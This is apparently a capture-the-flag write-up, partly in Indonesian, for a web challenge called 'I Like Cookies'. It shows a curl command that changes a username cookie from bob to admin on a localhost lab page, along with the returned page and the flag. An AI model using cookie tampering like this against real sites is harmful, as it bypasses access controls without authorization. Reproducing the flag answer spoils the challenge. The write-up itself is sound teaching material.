<h1><b>I Like Cookies</h1></b>
<pre>
I Like Cookies
</pre>
</b><h3>Solution</h3></b>
<p>Jika kita perhatikan user cookie=bob, ganti ke admin dengan tool edit cookie atau curl</p>

```console
root@Python:/var/www/html/CTF# curl --cookie 'username=admin' http://localhost/CTF/Web_warning/Web-Warning-5.php
<!DOCTYPE html>
<html>
<head>
	<title>Web Warning-5</title>
	<link rel="stylesheet" type="text/css" href="most_template.css" media="all" />
</head>
<body align='center' style="background-color:rgb(100,100,100)">

<h2 class='success'>Your Flag is VenomCTF{It_Cook1e_f0r_y0u}</h2><img src="../image/cookiess.jpg" width="600">
</body>
</html>
```
</b><h3>Flag</h3></b>
<pre>
VenomCTF{It_Cook1e_f0r_y0u}
</pre>
